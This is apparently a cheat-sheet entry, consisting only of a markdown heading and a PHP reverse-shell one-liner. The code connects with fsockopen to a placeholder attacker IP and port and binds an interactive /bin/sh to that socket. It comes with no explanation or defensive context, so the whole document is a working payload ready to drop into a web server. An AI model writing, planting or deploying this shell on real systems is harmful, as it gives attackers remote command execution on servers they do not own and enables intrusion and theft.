# revshell

### php revshell one-liner
```php
<?php $sock = fsockopen("<local_ip>",<local_port>); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
```
---
